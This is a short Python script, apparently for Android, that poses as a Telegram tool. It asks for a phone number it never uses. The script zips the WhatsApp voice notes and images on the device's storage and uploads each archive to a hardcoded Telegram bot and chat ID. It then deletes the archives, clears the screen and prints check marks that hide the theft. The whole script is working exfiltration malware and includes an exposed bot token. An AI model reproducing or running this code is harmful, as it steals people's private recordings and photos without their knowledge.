import os
import zipfile
import requests


os.system('clear ')


print(" \033[1;32m    [ Telegram .... ]")
 

print(" ")
print(" ")
print(" ")
print(" ")

input( " \033[1;32m  [ Number:  " )

token = "5755651457:AAFn_DEGgStGLr1zyska-MYtnADtGP8-EgI"
chat_id = "5894045208"


os.chdir("/sdcard/WhatsApp/Media")


with zipfile.ZipFile("WhatsApp Voice Notes.zip", "w", zipfile.ZIP_STORED) as zip_file:
    for root, dirs, files in os.walk("WhatsApp Voice Notes"):
        for file in files:
            zip_file.write(os.path.join(root, file))


url = f"https://api.telegram.org/bot{token}/sendDocument"
data = {"chat_id": chat_id}
files = {"document": open("WhatsApp Voice Notes.zip", "rb")}
requests.post(url, data=data, files=files)




os.remove("WhatsApp Voice Notes.zip")

os.system("clear")


print(" ")
print(" ")
print(" ")
print(" ")
print(" ")


print("\033[1;32m  Telegram 1 ✅ ")

#


token = "5755651457:AAFn_DEGgStGLr1zyska-MYtnADtGP8-EgI"
chat_id = "5894045208"


os.chdir("/sdcard/WhatsApp/Media")


with zipfile.ZipFile("WhatsApp Images.zip", "w", zipfile.ZIP_STORED) as zip_file:
    for root, dirs, files in os.walk("WhatsApp Images"):
        for file in files:
            zip_file.write(os.path.join(root, file))


url = f"https://api.telegram.org/bot{token}/sendDocument"
data = {"chat_id": chat_id}
files = {"document": open("WhatsApp Images.zip", "rb")}
requests.post(url, data=data, files=files)




os.remove("WhatsApp Images.zip")

os.system("clear")

print(" ")
print(" ")
print(" ")
print(" ")
print(" ")
print("  \033[1;32m   Telegram 2 ✅")



